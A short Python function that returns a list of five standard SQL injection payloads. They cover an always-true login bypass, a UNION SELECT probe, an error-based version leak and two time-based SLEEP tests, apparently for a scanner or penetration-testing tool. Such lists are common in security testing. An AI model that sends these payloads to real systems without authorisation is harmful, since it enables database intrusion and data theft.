def generate_payloads():
    return [
        "' OR '1'='1'--",
        "' UNION SELECT NULL, NULL--",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' OR SLEEP(5)--",
        "' AND IF(1=1, SLEEP(5), 0)--"
    ]